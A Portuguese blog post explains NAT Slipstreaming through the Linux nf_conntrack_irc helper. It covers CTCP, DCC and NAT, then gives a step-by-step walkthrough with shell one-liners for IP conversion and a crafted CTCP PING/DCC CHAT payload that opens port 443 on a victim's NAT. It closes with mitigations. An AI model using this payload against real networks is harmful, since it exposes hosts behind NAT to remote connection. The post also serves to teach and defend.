---
title: 'NAT Slipstreaming no IRC'
layout: post
---

NAT Slipstreaming no IRC
===

![irc](https://upload.wikimedia.org/wikipedia/commons/1/14/IRC_cover.png)

[toc]

# Introdução
> Na informática, o Internet relay chat (conhecido pela abreviação IRC) é um sistema de bate-papo online no formato texto/teletexto comunitário (originalmente protocolo de texto simples), criado em 1988 por Jarkko Oikarinen, que permite discussões entre vários participantes nos chamados "canais de conversação", e conversas entre apenas dois parceiros de forma particular (em diálogos de perguntas e respostas, por exemplo),[1] utilizando o programa de chat chamado "cliente IRC" conectando-se a um servidor IRC. Qualquer participante pode criar um novo canal de conversa e, um único usuário de computador pode, participar de vários canais simultâneos. 

Resumindo: o famoso mIRC, Mibbit, KiwiIRC, etc..

É claro, o IRC não morreu antes de 2010, mas deu uma enfraquecida e só foi voltar a ativa em 2015/17. Mas hoje em dia é raro encontrar servidores IRC ativos, infelizmente...

Bom, o que eu quero abordar aqui não é só sobre IRC, e sim os perigos de usar IRC com uma conexão não criptografada, ou seja, sem TLS/SSL (e se bobiar até hoje não criptografam a própria conexão) sobre NAT.
# O que é CTCP
Primeiro vou começar falando sobre CTCP e DCC, o essencial

O protocolo Client-to-client Protocol (CTCP) é um tipo especial de protocolo de comunicação entre clientes do IRC. O CTCP é um protocolo comum implementado pela maioria dos principais IRC Clients (hehehe) e amplia o protocolo original do IRC, permitindo que os usuários consultem outros clientes ou canais, o que faz com que todos os clientes do canal respondam a uma query CTCP pra obter informações específicas

O CTCP também pode ser usado para codificar mensagens que o IRC não permitiria que fossem enviadas, tipo `^A`, null byte, newlines

O CTCP usa o caractere `^A` (`\001`) pra marcar as mensagens especiais, mensagens de controle, não de usuários. Pois pra mexer entre usuários o CTCP precisa da sua cara metade, sua alma gêmea, o DCC.
## Estrutura
Antes de ir pro DCC vou abordar a estrutura do CTCP, que é importante.

Você pode enviar uma mensagem CTCP/DCC com o PRIVMSG do IRC pra um usuário, mas o primeiro e ultimo caractere da mensagem tem que ser `^A`, daí a resposta vai ser direcionada como se fosse o NOTICE ao invés do PRIVMSG.

Uma query CTCP tem essa estrutura exata:
```c
<ALVO> <COMANDO> <ARGUMENTO EXTRA>

| ALVO
|__ CANAL/APELIDO
| COMANDO
|__ COMANDO DO CTCP (DCC CHAT, VERSION ETC..)
| ARGUMENTO
|__ COMANDOS ADICIONAIS DIRECIONADOS AO ALVO
```

O comando que vamos utilizar é o `DCC CHAT`, que permite que um usuário interaja/converse com o outro por meio do DCC, como eu expliquei. O tráfego da conversa é puro entre os usuários, secão mesmo, não passa pelo servidor IRC. Aí que mora o perigo Aí que você cai lindo.

A estrutura do `DCC CHAT` é bem simples:
```c 
<PROTOCOLO> <IP> <PORTA>

| PROTOCOLO
|__ PROTOCOLO (pode ser qualquer coisa)
| IP
|__ IP DO ALVO (em decimal)
| PORTA
|__ PORTA DO ALVO (tente adivinhar)
```

Lembrando que todo `DCC CHAT` tem que terminar obrigatoriamente com CRLF (`\r\n`).

## DCC
O Direct Client-to-Client (DCC) é um subprotocolo do CTCP/IRC que permite que 2 endereços se interconectem usando um servidor IRC para o handshaking, tipo um intermediador, afim de trocar mensagens sem retransmissão, como eu expliquei ali.

É importante saber também que uma vez que é estabelecida, a sessão do DCC é executada independente do servidor IRC.

O DCC também envia a um cliente informações do IP e da porta de outro cliente que ele vai se conectar (obviamente).

Se você estiver usando NAT, o DCC vai ser usado pelo helper `nf_conntrack_irc` do NetFilter (no Linux, infelizmente só podemos zoar o Linux com esta trick de slipstreaming).
# NetFilter sendo NetFilter
O NetFilter é um framework fornecido do kernel Linux que mexe com a rede e te permite manipula-la.

Ele oferece várias funções e operações pra Packet Filtering e NAT/PAT.

O NetFilter representa um conjunto de hooks do kernel, permitindo que módulos específicos do kernel registrem callbacks com a stack de rede.
## Conntrack
O NF tem um recurso chamado Connection Tracking que permite que o kernel tenha ciencia de todas as conexões/sessões de rede e correlacione os packets pra compor a conexão pro NAT

E o NAT usa essas informações pra traduzir os packets passados por ele igual o NF faz. Um firewall também faz isso, por exemplo o IPTables e o Sophos.

O Connection Tracking/Conntrack do NF tem auxiliares (Helpers) pra se estender sob diversos protocolos como FTP (`nf_conntrack_ftp`), IRC (`nf_conntrack_irc`) entre outros..

Os helpers inspecionam apenas um packet por vez, então se as informações pro Conntrack estiverem divididas em 2 packets (por causa de fragmentação do endereço IP ou TCP Segmentation, sei la) o helper não vai reconhecer os padrões e não vai funcionar direito.
# O que é NAT
O Network Address Translation (NAT) é um método pra mapear o Address Space (basicamente uma range de endereços/numeros representando um objeto, tipo um endereço IP. No caso o address space de uma pool/range de endereços IPs seria por exemplo 172.\*.\*.\*) de um endereço ip em outro.

O NAT foi originalmente usado e criado acabar com a necessidade de ter que atribuir um endereço a cada host da pool quando alguma coisa relacionada à rede em si era mudada. Imagina o trabalho disso tudo antes do NAT.

Curiosidade: um endereço IP roteável pela internet de uma gateway do NAT pode ser usado pra uma rede privada inteira. 
## Slipstreaming
O NAT Slipstreaming é um ataque bem parecido com o NAT Pinning, é basicamente um Packet Injection que pode funcionar tanto no IRC quanto em qualquer outro protocolo, até HTTP.

O que faz isso ser possível é a porra do Application Level Gateway, que se for juntado ao NAT, pode se conectar remotamente à sua máquina. No caso no HTTP pode ser pelo WebRTC, e no IRC pode ser pelo DCC.

Com o payload certo, o NAT pode abrir a porta desejada pelo atacante, o que é muito crítico.
# Pondo em prática (depois de 3 séculos..)
Antes de começar, vou deixar claro que essa falha só é presente no Linux na release 5.9, e é antiga e quase todos (se não todos) os clientes já patchearam isso, e o NetFilter também.

Ok agora sem falatórios vamos pro hacking..

Podemos escolher um alvo à dedo e enviar uma query CTCP com o comando `PING` e o nosso payload, mas primeiro precisamos saber o endereço do servidor da rede IRC que ele está conectado, podemos usar o WHOIS do IRC.
```cpp
[client] /whois g
│02:39:31 irc.fodas.org  -- | [g] (~g@ngst.er): g
│02:39:31 irc.fodas.org  -- | [g] 192.223.24.132 (IRC Network)
│02:39:31 irc.fodas.org  -- | [g] End of /WHOIS list.
```
Agora que temos o endereço IP do servidor que ele está conectado (`192.223.24.132`), só converter pra decimal e fazer a zoeirinha clássica.
```cpp
seppuku> echo 192.223.24.132 | tr . '\n' | awk '{s = s*256 + $1} END{print s}'
3235846276
```
Ótimo, `3235846276`. Agora vamos construir o payload com o `DCC CHAT` e enviar pra nossa vitima `g`:
```cpp
PRIVMSG g: ^APING ^ADCC CHAT x 3235846276 443^A
                               |__ IP     |__ PORTA A SER ABERTA
```
Na tela do atacante o endereço IP do servidor na resposta deve ser substituído pelo endereço IP da vítima.
```graphql
CTCP ping reply from g: ADCC CHAT x 387151157 443
```
Agora sabemos que `387151157` é o endereço IP do alvo e com certeza a porta `443` agora está aberta. O que devemos fazer é transformar o endereço IP do alvo de decimal pra normal:
```cpp
seppuku> (export l33t=387151157; for i in {1..4}; do s='.'$((l33t%256))$s && ((l33t>>=8)); done; echo ${s:1})
23.19.117.53
```
Agora podemos tentar a sorte em `23.19.117.53:443` kkkkkk
# Conclusão
**Use TLS/SSL.**

Não só no IRC, mas em TUDO, e quando eu digo TUDO eu estou me referindo à TUDO MESMO.

Você pode optar também por usar SDCC (Secure DCC)/`DCC SCHAT`, que é criptografado. Ou desabilitar o IRC Helper do Connection Tracking do NetFilter (`nf_conntrack_irc`).

Mas já que isso só ocorre numa release antiga do Linux, é só estar sempre atualizado.
